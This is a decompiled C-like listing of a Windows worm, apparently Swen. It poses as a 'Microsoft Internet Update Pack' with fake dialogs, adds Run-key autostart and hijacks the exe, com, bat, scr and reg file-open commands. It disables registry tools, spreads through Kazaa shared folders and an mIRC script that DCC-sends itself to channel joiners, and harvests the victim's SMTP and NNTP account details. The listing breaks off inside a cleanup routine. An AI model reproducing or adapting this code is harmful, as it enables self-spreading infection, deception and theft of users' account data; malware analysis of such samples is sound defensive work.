            (save)A8;
            L0040A0F0();
            (save)" ";
            (save)A8;
            L0040A100();
            (save)4;
            (save) *(ebp + L00406850() * 4 - 20);
            goto L004085df;
        }
        L0040A0F0(A8, *(ebp + L00406850() * 4 + -180), 18);
    }
    if(L00406840(8) != 0) {
        *__imp__CharLowerA(A8);
    }
    return(A8);
}

stack space not deallocated on return
/*	Procedure: 0x0040864E - 0x004087AC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040864E()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253120;
    (save)0x40a384;
    eax = *%fs:0x0];
    (save)eax;
    *%fs:0x0] = esp;
    esp = esp - 80;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    ebx = *(ebp + 8);
    if(ebx != 0) {
        (save)ebx;
        *__imp__UpdateWindow();
        (save)ebx;
        L00408962();
        *esp = 1008;
        (save)ebx;
        esi = __imp__GetDlgItem;
        eax = *__imp__GetDlgItem();
        *(ebp - 92) = eax;
        (save) *(ebp - 92);
        *(ebp - 88) = *__imp__GetDC();
        (save)11141120;
        *(ebp - 48) = *__imp__CreateSolidBrush();
        (save)8;
        (save) *__imp__GetStockObject();
        (save) *(ebp - 88);
        *__imp__SelectObject();
        (save) *(ebp - 48);
        (save) *(ebp - 88);
        *__imp__SelectObject();
        (save)ebp - 44;
        (save) *(ebp - 92);
        *__imp__GetClientRect();
        edi = *(ebp + 12);
        if(edi != 0) {
            if(edi != 1) {
                <= ? L00408721 : ;
                if(edi > 3) {
                    if(edi != 4) {
                        goto L00408721;
                    }
                    (save)"Updating registry ...";
                } else {
                    (save)"Copying files ...";
                }
            } else {
                (save)"Extracting files ...";
            }
        } else {
            (save)"Searching for installed components ...";
        }
        (save)ebp - 80;
        L0040A0F0();
        (restore)ecx;
L00408721:
        (save)ebp - 80;
        (save)1009;
        (save)ebx;
        *__imp__SetWindowTextA( *esi());
        eax = *(ebp - 36) + -2;
        asm("cdq");
        (save)5;
        edx = ecx / ecx % ecx / ecx;
        ecx = eax;
        edi = edi * ecx;
        ecx = ecx + 1;
        *(ebp - 28) = ecx;
        esi = edi + 1;
        eax = eax * esi;
        esi = esi + 1 + 1;
        *(ebp - 96) = esi;
        for(*(ebp - 84) = ecx; *(ebp - 84) <= esi; *(ebp - 84) = *(ebp - 84) + 1) {
            (save) *(ebp - 32) - 1;
            (save) *(ebp - 84);
            (save)1;
            (save)1;
            (save) *(ebp - 88);
            *__imp__Rectangle();
            (save)20;
            *__imp__Sleep();
        }
        *__imp__ReleaseDC();
        eax = *__imp__DeleteObject( *(ebp - 48), ebx, *(ebp - 88));
        goto L0040879a;
        return(1);
        esp = *(ebp - 24);
    }
L0040879a:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x004087AD - 0x004087D6
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L004087AD(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    if(A8 != 272) {
        eax = 0;
    } else {
        *__imp__ShowWindow();
        *__imp__UpdateWindow(Vfffffffc, A4, 5);
        eax = 1;
    }
}

stack space not deallocated on return
/*	Procedure: 0x004087D7 - 0x00408961
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004087D7()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253136;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 220;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    ebx = *(ebp + 8);
    *(ebp - 32) = ebx;
    if(L0040A5F0(ebx, "012345:", 7) == 0) {
        eax = ebx + 7;
        *(ebp - 32) = eax;
        (save) *(ebp - 32);
        (save)ebp + -132;
        L0040A0F0();
        (save)ebp + -132;
        (save)ebx;
        L0040A0F0();
        esp = esp + 16;
    }
    (save)ebx;
    eax = *__imp__GetFileAttributesA();
    *(ebp - 28) = eax;
    if(eax != -1) {
        eax = L0040A210(ebx);
        *(ebp - 28) = eax;
        if(*( *(ebp - 28) + ebx - 1) != 92) {
            L0040A100(ebx, "\");
        }
        *(ebp + -136) = 0;
        esi = __imp__wsprintfA;
        for(edi = __imp__CopyFileA; *(ebp + -136) < *(ebp + 20); *(ebp + -136) = *(ebp + -136) + 1) {
            (save)L00408444(ebp + -236);
            (save)ebx;
            (save)"%s%s.zip";
            (save)ebp + -132;
            *esi();
            (save) *(ebp + 12);
            (save)0x412f00;
            (save)"%s\%s.zip";
            (save)ebp + -236;
            *esi();
            esp = esp + 36;
            (save)1;
            (save)ebp + -132;
            (save)ebp + -236;
            if(*edi() != 0) {
                L00407E9C(ebp + -132);
            }
        }
        for(*(ebp + -136) = 0; 1; *(ebp + -136) = *(ebp + -136) + 1) {
            eax = *(ebp + -136);
            if(eax >= *(ebp + 24)) {
                goto L0040894f;
            }
            (save)L00408444(ebp + -236);
            (save)ebx;
            (save)"%s%s.exe";
            (save)ebp + -132;
            *esi();
            esp = esp + 20;
            (save)1;
            (save)ebp + -132;
            (save) *(ebp + 16);
            if(*edi() != 0) {
                L00407E9C(ebp + -132);
            }
        }
        return(1);
        esp = *(ebp - 24);
    }
L0040894f:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00408962 - 0x004089A0
 *	Argument size: -24
 *	Local size: 28
 *	Save regs size: 0
 */

L00408962(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe4;



    (save)esi;
    if(A8 != 0) {
        esi = 0;
        do {
            (save)1;
            (save)0;
            (save)0;
            (save)A8;
            (save) & Vffffffe4;
            eax = *__imp__PeekMessageA();
            if(eax == 0) {
                break;
            }
            eax = *__imp__IsDialogMessageA(A8, & Vffffffe4);
            esi = esi + 1;
        } while(esi < 1000);
    }
    (restore)esi;
}

stack space not deallocated on return
/*	Procedure: 0x004089A1 - 0x00409A72
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004089A1()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253152;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 2572;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 28) = 0;
    *(ebp - 4) = 0;
    esi = 4302344;
    if(L00406DCD(4302344) == 0) {
        *(ebp + -544) = bl;
        *(ebp + -552) = ebx;
        edi = 0;
        *(ebp + -548) = 0;
        do {
            eax = L00406850(26);
            *(ebp - 32) = eax;
            *(ebp + -552) = *(ebp + -552) + eax;
            eax = eax + 64;
            *(ebp + edi + -544) = al;
            edi = edi + 1;
            *(ebp + -548) = edi;
        } while(*(ebp + -552) < 54);
        *(ebp + edi + -544) = 144 - *(ebp + -552);
        *(ebp + edi + -543) = bl;
        (save)"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";
        (save)esi;
        L0040A0F0();
        (save)"\";
        (save)esi;
        L0040A100();
        (save)ebp + -544;
        (save)esi;
        L0040A100();
        esp = esp + 24;
    }
    (save)200;
    (save)ebp + -236;
    (save)ebx;
    *__imp__GetModuleFileNameA();
    eax = L0040A1E0(ebp + -236, 92);
    *(ebp - 36) = eax;
    eax = eax == ebx ? ebp + -236 : eax + 1;
    *(ebp - 36) = eax;
    al = *eax;
    if(al == 112 || al == 80 || al == 113 || al == 81 || al == 117 || al == 85 || al == 105 || al == 73) {
        *(ebp - 28) = 1;
    }
    if(L0040679E(-2147483646, esi, "Installed", ebp + -544) != 0) {
        eax = L0040D680(ebp + -544, "... by Begbie");
        if(eax != 0) {
            goto L00408b15;
        }
        if(*(ebp - 28) != ebx) {
            (save)48;
            (save)"Microsoft Internet Update Pack";
            (save)"This update does not need to be installed on this system.";
            (save)ebx;
            eax = *__imp__MessageBoxA();
        }
    } else {
L00408b15:
        (save)5;
        (save)L00406850() + 3;
        (save)ebp + -676;
        L004068F4();
        (save)".exe";
        (save)ebp + -676;
        L0040A100();
        (save)ebp + -676;
        edi = 0x412f00;
        (save)0x412f00;
        (save)"%s\%s";
        (save)ebp + -1136;
        esi = __imp__wsprintfA;
        *__imp__wsprintfA();
        esp = esp + 36;
        (save)1;
        (save)ebp + -1136;
        (save)ebp + -236;
        *__imp__CopyFileA();
        (save)ebp + -676;
        (save)"%s autorun";
        (save)ebp + -544;
        *esi();
        (save)6;
        (save)L00406850() + 3;
        (save)ebp + -876;
        L004068F4();
        (save)ebp + -544;
        (save)1;
        (save)ebp + -876;
        (save)"Software\Microsoft\Windows\CurrentVersion\Run";
        (save)-2147483646;
        L004066EB();
        (save)ebp + -876;
        (save)1;
        (save)"Install Item";
        (save)4302344;
        (save)-2147483646;
        L004066EB();
        esp = esp + 64;
        if(*(ebp - 28) != ebx) {
            (save)36;
            (save)"Microsoft Internet Update Pack";
            (save)"This will install Microsoft Security Update.\r\n\r\nDo you wish to continue?";
            (save)ebx;
            if(*__imp__MessageBoxA() == 7) {
                *(ebp - 28) = ebx;
            }
        }
        *(ebp - 32) = 100;
        (save)ebp - 32;
        (save)ebp + -544;
        if(*__imp__GetComputerNameA() != 0) {
            *esi(ebp + -876, "%s\%s.bat", edi, ebp + -544);
            (save)ebx;
            (save)128;
            (save)2;
            (save)ebx;
            (save)ebx;
            (save)1073741824;
            (save)ebp + -876;
            eax = *__imp__CreateFileA();
            *(ebp + -2468) = eax;
            if(*(ebp + -2468) != -1) {
                *esi(ebp + -544, "\r\n@ECHO OFF\r\nIF NOT \"%%1\"==\"\" %s %%1\r\n", ebp + -676);
                (save)ebx;
                (save)ebp - 32;
                (save)L0040A210(ebp + -544);
                (save)ebp + -544;
                (save) *(ebp + -2468);
                *__imp__WriteFile();
                (save) *(ebp + -2468);
                *__imp__SetEndOfFile();
                (save) *(ebp + -2468);
                *__imp__CloseHandle();
                L00407E9C(ebp + -876);
            }
        }
        *(ebp + -1152) = ebx;
        if(*(ebp - 28) != ebx) {
            (save)ebx;
            (save)0x4087ad;
            (save)ebx;
            (save)123;
            (save) *L0041A594;
            eax = *__imp__CreateDialogParamA();
            *(ebp + -1152) = eax;
            L0040864E( *(ebp + -1152), ebx);
        }
        L0040772C( *(ebp + -1152));
        if(*(ebp - 28) != ebx) {
            L0040864E( *(ebp + -1152), 1);
        }
        *(ebp + -1688) = ebx;
        (save)ebp + -1788;
        (save)100;
        eax = *__imp__GetTempPathA();
        *(ebp - 32) = eax;
        if(*(ebp + *(ebp - 32) + -1789) != 92) {
            L0040A100(ebp + -1788, "\");
        }
        L0040A100();
        L0040A100(ebp + -1788, ".exe", ebp + -1788, L004073F8(), ebp + -544);
        (save)1;
        (save)ebp + -1788;
        (save)ebp + -236;
        *__imp__CopyFileA();
        (save)4;
        (save)L00406850() + 3;
        (save)ebp + -1392;
        (save)L004068F4();
        (save)edi;
        (save)"%s\%s.zip";
        (save)ebp + -2212;
        *esi();
        esp = esp + 28;
        *(ebp + -548) = ebx;
        for(edi = __imp__ShellExecuteA; 1; *(ebp + -548) = *(ebp + -548) + 1) {
            eax = *(ebp + -548);
            if(eax >= 2) {
                goto L00408ec7;
            }
            if(eax = eax - ebx) {
                (save)"WinRar.exe";
                (save)ebp + -2364;
                L0040A0F0();
                (save)ebp + -1788;
                (save)ebp + -2212;
                (save)"A -EP %s %s";
            } else {
                if(eax = eax - 1) {
                    goto L00408e2e;
                }
                (save)"WinZip.exe";
                (save)ebp + -2364;
                L0040A0F0();
                (save)ebp + -2212;
                (save)ebp + -1788;
                (save)"-min -e -o %s %s";
            }
            (save)ebp + -1544;
            *esi();
            esp = esp + 24;
L00408e2e:
            (save)ebx;
            (save)ebx;
            (save)ebp + -1544;
            (save)ebp + -2364;
            (save)ebx;
            (save)ebx;
            if(*edi() > 32) {
                break;
            }
            L0040A0F0(ebp + -544, "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\");
            eax = "WinRar.exe";
            if(*(ebp + -548) != ebx) {
                eax = "WinZip.exe";
            }
            (save)eax;
            (save)ebp + -544;
            L0040A100();
            (save)ebp + -2364;
            (save)ebx;
            (save)ebp + -544;
            (save)-2147483646;
            esp = esp + 24;
            if(L0040679E() != 0) {
                (save)ebx;
                (save)ebx;
                (save)ebp + -1544;
                (save)ebp + -2364;
                (save)ebx;
                (save)ebx;
                if(*edi() > 32) {
                    break;
                }
            }
        }
        *(ebp + -1688) = 1;
L00408ec7:
        if(*(ebp + -1688) != ebx) {
            (save)ebp + -1392;
            (save)1;
            (save)"ZipName";
            (save)4302344;
            (save)-2147483646;
            L004066EB();
            (save)ebp + -2212;
            L00407E9C();
            esp = esp + 24;
            (save)1000;
            *__imp__Sleep();
        }
        (save)ebp + -1788;
        *__imp__DeleteFileA();
        *(ebp + -2060) = ebx;
        (save)ebp + -2060;
        (save)1;
        (save)ebx;
        (save)"Software\Kazaa";
        edi = -2147483647;
        (save)-2147483647;
        *__imp__RegOpenKeyExA();
        if(*(ebp + -2060) != ebx) {
            (save) *(ebp + -2060);
            *__imp__RegCloseKey();
            (save)"Software\Kazaa";
            (save)ebp + -544;
            L0040A0F0();
            (save)"\LocalContent";
            (save)ebp + -544;
            L0040A100();
            *(ebp - 32) = ebx;
            (save)ebp - 32;
            (save)4;
            (save)"DisableSharing";
            (save)ebp + -544;
            (save)edi;
            L004066EB();
            esp = esp + 36;
            for(*(ebp + -548) = ebx; *(ebp + -548) < 2; *(ebp + -548) = *(ebp + -548) + 1) {
                L0040A0F0(ebp + -544, "Software\Kazaa");
                if(*(ebp + -548) != ebx) {
                    (save)"\Transfer";
                    (save)ebp + -544;
                    L0040A100();
                    (save)"DlDir0";
                } else {
                    (save)"\LocalContent";
                    (save)ebp + -544;
                    L0040A100();
                    (save)"DownloadDir";
                }
                (save)ebp + -876;
                L0040A0F0();
                esp = esp + 16;
                L0040679E(edi, ebp + -544, ebp + -876, ebp + -2568);
                if(*(ebp + -2568) != bl) {
                    *(ebp + -2584) = *(ebp + -1688) == ebx ? ebx : L00406850(5) + 1 + 1;
                    (save)3;
                    (save)L00406850();
                    (save) *(ebp + -2584);
                    (save)ebp + -236;
                    eax = ~( *(ebp + -1688));
                    asm("sbb eax,eax");
                    (save)eax & ebp + -1392;
                    (save)ebp + -2568;
                    L004087D7();
                    esp = esp + 24;
                }
            }
            (save)ebp + -1788;
            (save)100;
            eax = *__imp__GetTempPathA();
            *(ebp - 32) = eax;
            if(*(ebp + *(ebp - 32) + -1789) != 92) {
                L0040A100(ebp + -1788, "\");
            }
            (save)5;
            (save)L00406850() + 1 + 1;
            (save)ebp + -544;
            (save)L004068F4();
            (save)ebp + -1788;
            L0040A100();
            esp = esp + 20;
            (save)ebx;
            (save)ebp + -1788;
            if(*__imp__CreateDirectoryA() != 0) {
                (save)"Software\Kazaa";
                (save)ebp + -544;
                L0040A0F0();
                (save)"\LocalContent";
                (save)ebp + -544;
                L0040A100();
                (save)"012345:";
                (save)ebp + -876;
                L0040A0F0();
                (save)ebp + -1788;
                (save)ebp + -876;
                L0040A100();
                (save)ebp + -876;
                (save)1;
                (save)"Dir99";
                (save)ebp + -544;
                (save)edi;
                L004066EB();
                esp = esp + 52;
                *(ebp + -2588) = *(ebp + -1688) != ebx ? L00406850(5) + 1 + 1 : ebx;
                (save)3;
                (save)L00406850();
                (save) *(ebp + -2588);
                (save)ebp + -236;
                eax = ~( *(ebp + -1688));
                asm("sbb eax,eax");
                (save)eax & ebp + -1392;
                (save)ebp + -1788;
                L004087D7();
                esp = esp + 24;
            }
            L004066EB(-2147483646, 4302344, "Kazaa Infect", 1, "yes");
        }
        if(*(ebp - 28) != ebx) {
            L0040864E( *(ebp + -1152), 2);
        }
        for(*(ebp + -548) = ebx; *(ebp + -548) < 2; *(ebp + -548) = *(ebp + -548) + 1) {
            if(*(ebp + -548) != ebx) {
                L0040679E(-2147483646, "Software\Microsoft\Windows\CurrentVersion", "ProgramFilesDir", ebp + -544);
            } else {
                L0040A0F0(ebp + -544, "C:");
            }
            for(*(ebp + -556) = ebx; 1; *(ebp + -556) = *(ebp + -556) + 1) {
                if(*(ebp + -556) >= 2) {
                    goto L0040944d;
                }
                if(*(ebp + -556) != ebx) {
                    (save)"\mirc32";
                } else {
                    (save)"\mirc";
                }
                (save)ebp + -544;
                L0040A100();
                (restore)ecx;
                L0040A0F0();
                L0040A100(ebp + -876, "\mirc.ini", ebp + -876, ebp + -544);
                (save)ebp + -876;
                if(*__imp__GetFileAttributesA() != -1) {
                    (save)ebp + -544;
                    (save)ebp + -2464;
                    L0040A0F0();
                    (save)ebp + -544;
                    (save)ebp + -876;
                    L0040A0F0();
                    (save)"\script.ini";
                    (save)ebp + -876;
                    esp = esp + 24;
                    (save)L0040A100();
                    if(*__imp__GetFileAttributesA() != -1) {
                        (save)L0040A100(ebp + -544, "\script.bcp");
                        (save)ebp + -876;
                        *__imp__MoveFileA();
                    }
                    (save)ebx;
                    (save)128;
                    (save)2;
                    (save)ebx;
                    (save)1;
                    (save)1073741824;
                    (save)ebp + -876;
                    eax = *__imp__CreateFileA();
                    *(ebp + -2572) = eax;
                    if(*(ebp + -2572) != -1) {
                        break;
                    }
                }
            }
            (save)ebp + -876;
            if(*(ebp + -1688) == ebx) {
                (save)L00408444();
                (save)0x412f00;
                (save)"%s\%s.exe";
                (save)ebp + -544;
                *esi();
                esp = esp + 20;
                (save)200;
                (save)ebp + -876;
                (save)ebx;
                *__imp__GetModuleFileNameA();
            } else {
                (save)L00408444();
                (save)0x412f00;
                (save)"%s\%s.zip";
                (save)ebp + -544;
                *esi();
                (save)ebp + -2212;
                (save)ebp + -876;
                L0040A0F0();
                esp = esp + 28;
            }
            (save)1;
            (save)ebp + -544;
            (save)ebp + -876;
            if(*__imp__CopyFileA() != 0) {
                L00407E9C(ebp + -544);
            }
            (save)"[script]\r\nn0= on 1:JOIN:#:{\r\nn1= /if ( $nick == $me ) { halt }\r\nn2= /.dcc send $nick \"";
            (save)ebp + -876;
            L0040A0F0();
            (save)ebp + -544;
            (save)ebp + -876;
            L0040A100();
            (save)"\"\r\nn3=}\r\n";
            (save)ebp + -876;
            L0040A100();
            esp = esp + 24;
            *(ebp - 32) = ebx;
            (save)ebx;
            (save)ebp - 32;
            (save)L0040A210(ebp + -876);
            (save)ebp + -876;
            (save) *(ebp + -2572);
            *__imp__WriteFile();
            (save) *(ebp + -2572);
            *__imp__CloseHandle();
            L004066EB(-2147483646, 4302344, "Mirc Install Folder", 1, ebp + -2464);
L0040944d:
        }
        (save)ebp + -544;
        (save)"Default Mail Account";
        (save)"SOFTWARE\Microsoft\Internet Account Manager";
        (save)edi;
        L0040679E();
        (save)ebp + -876;
        (save)"Default News Account";
        (save)"SOFTWARE\Microsoft\Internet Account Manager";
        (save)edi;
        L0040679E();
        esp = esp + 32;
        if(*(ebp + -544) == bl) {
            L0040A0F0(ebp + -544, "00000001");
        }
        (save)ebp + -544;
        (save)"SOFTWARE\Microsoft\Internet Account Manager\Accounts\%s";
        (save)ebp + -444;
        *esi();
        (save)ebp + -544;
        (save)"SMTP Email Address";
        (save)ebp + -444;
        (save)edi;
        L0040679E();
        (save)1;
        (save)ebp + -544;
        esp = esp + 36;
        if(L004075E3() != 0) {
            (save)ebp + -544;
            (save)ebp + -656;
            L0040A0F0();
            (save)ebp + -544;
            (save)"SMTP Server";
            (save)ebp + -444;
            (save)edi;
            L0040679E();
            (save)ebx;
            (save)ebp + -544;
            esp = esp + 32;
            if(L004075E3() != 0) {
                (save)ebp + -656;
                (save)1;
                (save)"Email Address";
                (save)4302344;
                (save)-2147483646;
                L004066EB();
                (save)ebp + -544;
                (save)1;
                (save)"Server";
                (save)4302344;
                (save)-2147483646;
                L004066EB();
                (save)ebp + -544;
                (save)"SMTP Display Name";
                (save)ebp + -444;
                (save)edi;
                L0040679E();
                esp = esp + 56;
                if(*(ebp + -544) == bl) {
                    *(ebp - 32) = 100;
                    (save)ebp - 32;
                    (save)ebp + -544;
                    if(*__imp__GetComputerNameA() == 0) {
                        L0040A0F0(ebp + -544, "unknown");
                    }
                }
                L004066EB(-2147483646, 4302344, "VicName", 1, ebp + -544);
            }
        }
        if(*(ebp + -876) != bl) {
            (save)ebp + -876;
            (save)"SOFTWARE\Microsoft\Internet Account Manager\Accounts\%s";
            (save)ebp + -444;
            *esi();
            (save)ebp + -544;
            (save)"NNTP Server";
            (save)ebp + -444;
            (save)edi;
            L0040679E();
            (save)ebx;
            (save)ebp + -544;
            esp = esp + 36;
            if(L004075E3() != 0) {
                L0040A0F0();
                L0040A100(ebp + -876, "\swen0.dat", ebp + -876, 0x412f00);
                (save)ebx;
                (save)128;
                (save)2;
                (save)ebx;
                (save)3;
                (save)1073741824;
                (save)ebp + -876;
                edi = *__imp__CreateFileA();
                *(ebp + -2576) = edi;
                if(edi != -1) {
                    (save)ebx;
                    (save)ebp - 32;
                    (save)L0040A210(ebp + -544);
                    (save)ebp + -544;
                    (save)edi;
                    *__imp__WriteFile();
                    (save)edi;
                    *__imp__CloseHandle();
                }
            }
        }
        if(*(ebp - 28) != ebx) {
            L0040864E( *(ebp + -1152), 3);
        }
        (save)ebx;
        eax = *__imp__GetModuleHandleA();
        *(ebp + -2052) = eax;
        (save)"CUSTOM";
        (save)129;
        (save) *(ebp + -2052);
        eax = *__imp__FindResourceA();
        *(ebp + -1684) = eax;
        (save) *(ebp + -1684);
        (save) *(ebp + -2052);
        *(ebp + -2056) = *__imp__SizeofResource();
        (save) *(ebp + -1684);
        (save)ebx;
        eax = *__imp__LoadResource();
        *(ebp + -1156) = eax;
        if(*(ebp + -1156) != ebx && *(ebp + -2056) > ebx) {
            (save)ebp + -544;
            (save)100;
            eax = *__imp__GetTempPathA();
            *(ebp - 32) = eax;
            *(ebp + *(ebp - 32) + -544) = bl;
            if(*(ebp + L0040A210(ebp + -544) + -545) != 92) {
                L0040A100(ebp + -544, "\");
            }
            L0040A100(ebp + -544, "nntptmp.fl");
            (save)ebx;
            (save)128;
            (save)2;
            (save)ebx;
            (save)3;
            (save)1073741824;
            (save)ebp + -544;
            edi = *__imp__CreateFileA();
            *(ebp + -1144) = edi;
            if(edi != -1) {
                (save)ebx;
                (save)ebp - 32;
                (save) *(ebp + -2056);
                (save) *(ebp + -1156);
                (save)edi;
                *__imp__WriteFile();
                (save)edi;
                *__imp__CloseHandle();
                (save)ebx;
                (save)ebp + -1292;
                (save)ebp + -544;
                edi = LZOpenFileA();
                *(ebp + -1140) = edi;
                if(edi >= ebx) {
                    *esi(ebp + -876, "%s\swen1.dat", 0x412f00);
                    (save)4096;
                    (save)ebp + -1680;
                    (save)ebp + -876;
                    eax = LZOpenFileA();
                    *(ebp + -1148) = eax;
                    (save) *(ebp + -1148);
                    (save)edi;
                    LZCopy();
                    (save)edi;
                    LZClose();
                    (save) *(ebp + -1148);
                    LZClose();
                }
                (save)ebp + -544;
                *__imp__DeleteFileA();
            }
        }
        L004066EB(-2147483646, 4302344, "Installed", 1, "... by Begbie");
        (save)ebx;
        (save)ebx;
        (save)"autorun";
        (save)ebp + -1136;
        (save)ebx;
        (save)ebx;
        *__imp__ShellExecuteA();
        (save)1000;
        *__imp__Sleep();
        *esi(ebp + -876, "%s \"%%1\" %%*", ebp + -676);
        *(ebp + -548) = ebx;
        for(edi = -2147483648; 1; *(ebp + -548) = *(ebp + -548) + 1) {
            eax = *(ebp + -548);
            if(eax >= 4) {
                break;
            }
            if(eax = eax - ebx) {
                (save)"exefile";
            } else {
                if(eax = eax - 1) {
                    (save)"comfile";
                } else {
                    if(eax = eax - 1) {
                        (save)"piffile";
                    } else {
                        if(eax = eax - 1) {
                            goto L004098dc;
                        }
                        (save)"batfile";
                    }
                }
            }
            (save)ebp + -544;
            L0040A0F0();
            (restore)ecx;
L004098dc:
            (save)"\shell\open\command";
            (save)ebp + -544;
            L0040A100();
            (save)ebp + -876;
            (save)1;
            (save)ebx;
            (save)ebp + -544;
            (save)edi;
            L004066EB();
            esp = esp + 28;
        }
        (save)ebp + -676;
        (save)"%s \"%%1\" /S";
        (save)ebp + -544;
        *esi();
        (save)ebp + -544;
        (save)1;
        (save)ebx;
        (save)"scrfile\shell\open\command";
        (save)edi;
        L004066EB();
        (save)ebp + -676;
        (save)"%s \"%%1\"";
        (save)ebp + -544;
        *esi();
        (save)ebp + -544;
        (save)1;
        (save)ebx;
        (save)"scrfile\shell\config\command";
        (save)edi;
        L004066EB();
        esp = esp + 64;
        (save)ebp + -676;
        (save)"%s showerror";
        (save)ebp + -544;
        *esi();
        (save)ebp + -544;
        esi = 1;
        (save)1;
        (save)ebx;
        (save)"regfile\shell\open\command";
        (save)edi;
        L004066EB();
        *(ebp - 32) = esi;
        (save)ebp - 32;
        (save)4;
        (save)"DisableRegistryTools";
        (save)"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        (save)-2147483647;
        L004066EB();
        esp = esp + 52;
        if(*(ebp - 28) != ebx) {
            L0040864E( *(ebp + -1152), 4);
            (save)ebx;
            (save) *(ebp + -1152);
            *__imp__EndDialog();
            (save)64;
            (save)"Microsoft Internet Update Pack";
            (save)"This update has been successfully installed.";
            (save)ebx;
            *__imp__MessageBoxA();
        }
        eax = *__imp__GetLogicalDrives();
        edi = eax;
        *(ebp + -244) = edi;
        for(esi = 0; 1; esi = esi + 1) {
            *(ebp + -548) = esi;
            if(esi >= 26) {
                goto L00409a60;
            }
            ecx = esi;
            eax = 1 << cl;
            if(!(edi & eax)) {
                *(ebp + -2048) = esi + 65;
                *(ebp + -2047) = 58;
                *(ebp + -2046) = 92;
                *(ebp + -2045) = bl;
                (save)ebp + -2048;
                eax = *__imp__GetDriveTypeA();
                *(ebp + -2580) = eax;
                if(eax == 4) {
                    eax = L00408003(ebp + -2048, ebp + -1136);
                }
            }
        }
        return(1);
        esp = *(ebp - 24);
    }
L00409a60:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00409A73 - 0x0040A00F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00409A73()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253168;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 264;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp + -140) = 0;
    *(ebp - 4) = 0;
    eax = "Explorer XBaseBar";
    (save)eax;
    (save)eax;
    eax = *__imp__FindWindowA();
    *(ebp + -136) = eax;
    if(eax != ebx) {
        (save)ebx;
        (save)ebx;
        (save)2;
        (save)eax;
        *__imp__PostMessageA();
    }
    for(*(ebp + -132) = ebx; *(ebp + -132) < 5; *(ebp + -132) = *(ebp + -132) + 1) {
        if(eax = *(ebp + -132) - ebx) {
            (save)"germs0.dbv";
        } else {
            if(eax = eax - 1) {
                (save)"germs1.dbv";
            } else {
                if(eax = eax - 1) {
                    (save)"swen0.dat";
                } else {
                    if(eax = eax - 1) {
                        (save)"swen1.dat";
                    } else {
                        if(eax = eax - 1) {
                            goto L00409b1e;
                        }
                        (save)"nntpgroups.dat";
                    }
                }
            }
        }
        (save)ebp - 128;
        L0040A0F0();
        (restore)ecx;
L00409b1e:
        *__imp__wsprintfA(ebp + -240, "%s\%s", 0x412f00, ebp - 128);
        (save)ebp + -240;
        if(*__imp__GetFileAttributesA() != -1) {
            (save)ebp + -240;
            *__imp__DeleteFileA();
        }
    }
    esi = 4302344;
    (save)4302344;
    L00406DCD();
    (save)ebp + -240;
    (save)"Install Item";
    (save)esi;
    edi = -2147483646;
    (save)-2147483646;
    esp = esp + 20;
    if(L0040679E() != 0) {
        (save)ebp + -140;
        (save)2;
        (save)ebx;
        (save)"Software\Microsoft\Windows\CurrentVersion\Run";
        (save)edi;
        *__imp__RegOpenKeyExA();
        if(*(ebp + -140) != ebx) {
            (save)ebp + -240;
            (save) *(ebp + -140);
            *__imp__RegDeleteValueA();
            (save) *(ebp + -140);
            *__imp__RegCloseKey();
        }
    }
    if(L0040679E(edi, esi, "Kazaa Infect", ebp + -240) != 0 && L0040D680(ebp + -240, "yes") == 0) {
        (save)"Software\Kazaa";
        (save)ebp - 128;
        L0040A0F0();
        (save)"\LocalContent";
        (save)ebp - 128;
        L0040A100();
        *(ebp - 28) = 1;
        (save)ebp - 28;
        (save)4;
        (save)"DisableSharing";
        (save)ebp - 128;
        (save)-2147483647;
        L004066EB();
        esp = esp + 36;
    }
    if(L0040679E(edi, esi, "Mirc Install Folder", ebp + -240) != 0) {
        *__imp__wsprintfA(ebp - 128, "%s\script.ini", ebp + -240);
        (save)ebp - 128;
        *__imp__DeleteFileA();
        L0040A100(ebp + -240, "\script.bcp");
        (save)ebp + -240;
        if(*__imp__GetFileAttributesA() != -1) {
            (save)ebp - 128;
            (save)ebp + -240;
            *__imp__MoveFileA();
        }
    }
    if(L0040679E(edi, esi, "Unfile", ebp - 128) != 0) {
        *__imp__wsprintfA(ebp + -240, "%s\%s", 0x412f00, ebp - 128);
        (save)ebx;
        (save)128;
        (save)3;
        (save)ebx;
        (save)3;
        esi = -2147483648;
        (save)-2147483648;
        (save)ebp + -240;
        eax = *__imp__CreateFileA();
        *(ebp + -244) = eax;
        if(eax != -1) {
